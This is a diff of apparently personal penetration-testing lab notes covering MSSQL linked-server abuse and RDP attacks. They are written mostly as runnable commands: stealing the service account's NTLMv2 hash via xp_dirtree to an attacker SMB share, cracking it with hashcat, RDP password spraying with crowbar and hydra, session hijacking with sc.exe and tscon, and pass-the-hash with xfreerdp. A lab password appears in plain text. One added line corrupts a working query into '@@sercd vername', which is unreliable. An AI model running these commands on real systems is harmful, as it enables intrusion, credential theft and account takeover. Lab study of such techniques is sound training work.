@@ -613,14 +613,14 @@ then run the commands.
 1>SELECT srvname, isremote FROM sysservers >GO
 -https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17
 -Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
-1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+1> EXECUTE('select @@sercd vername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 2> GO
 -Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
 
 <test>What is the password for the "mssqlsvc" user?
 $sudo apt install sqlcmd
 htbduser:MSSQLAccess01!:
-$sql -S <ip> -U htbdbuser
+$sqlcmd -S <ip> -U htbdbuser
 -In another terminal tab on Pwnbox/PMVPN, students need to start an SMB share with impacket-smbserver and utilize the flag -smb2support:
 $sudo impacket-smbserver share ./ -smb2support
 Afterward, using the terminal tab with the sqlcmd connection, students need to steal the MSSQL service account hash using either xp_subdirs or xp_dirtree, the latter will be used:
@@ -633,3 +633,61 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 $sqlcmd -S <ip> -U .\\mssqlsvc
 sql>use flagDB >GO > SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES >GO
 $SELECT * FROM tb_flag > GO
+
+\\Last vul SQL
+Initiation of the Attack
+Step	XP_DIRTREE	Concept of Attacks - Category
+1.	The source here is the user input, which specifies the function and the folder shared in the network.	Source
+2.	The process should ensure that all contents of the specified folder are displayed to the user.	Process
+3.	The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands.	Privileges
+4.	The SMB service is used as the destination to which the specified information is forwarded.	Destination
+This is when the cycle starts all over again, but this time to obtain the NTLMv2 hash of the MSSQL service user.
+Steal The Hash
+Step	Stealing the Hash	Concept of Attacks - Category
+5.	Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service.	Source
+6.	The data is then processed, and the specified folder is queried for the contents.	Process
+7.	The associated authentication hash is used accordingly since the MSSQL running user queries the service.	Privileges
+8.	In this case, the destination for the authentication and query is the host we control and the shared folder on the network.	Destination
+-Finally, the hash is intercepted by tools like Responder, WireShark, or TCPDump and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the documentation from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.
+
+\\\\=============================================
+Attacking RDP 
+-while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.
+By default, RDP uses port TCP/3389. Using Nmap, we can identify the available RDP service on the target host:
+$nmap -Pn -p3389 192.168.2.143
+\\Misconfigurations
+-Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration
+-One caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called Password Spraying. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.
+-Using the Crowbar tool, we can perform a password spraying attack against the RDP service. As an example below, the password password123 will be tested against a list of usernames in the usernames.txt file. The attack found the valid credentials as administrator : password123 on the target RDP host.
+$cat username.txt 
+root
+test
+user
+guest
+admin
+administrator
+\\Crowbar - RDP Password Spraying
+$crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+\\Hydra - RDP Password Spraying
+$hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+\\RDP Login 
+$rdesktop -u admin -p password123 192.168.2.143
+\\Protocol Specific Attacks
+-If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.
+\\RDP Session Hijacking
+As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.
+-To impersonate a user without their password, elevate to SYSTEM and run Microsoft tscon.exe to attach to another desktop session. Specify the target SESSION ID (e.g., 4 for the lewen session) and the current session name (e.g., rdp-tcp#13). For example, the command below opens a console as that SESSION_ID inside our current RDP session:
+tscon ${TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+-If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
+$query user
+$sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+-To run the command, we can start the sessionhijack service :
+$net start sessionhijack
+Once the service is started, a new terminal with the lewen user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.
+\\RDP Pass-the-Hash (PtH)
+-If GUI-only apps on a Windows host are needed during a pentest but you only have an NT hash (not the plaintext password), you can sometimes use an RDP Pass-the-Hash technique (e.g., via xfreerdp) to obtain RDP access. Note this approach has limitations — for example, the target must have Restricted Admin Mode enabled (it's off by default), otherwise the connection will fail with an error.
+-Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
+$reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
+$# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+-Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.
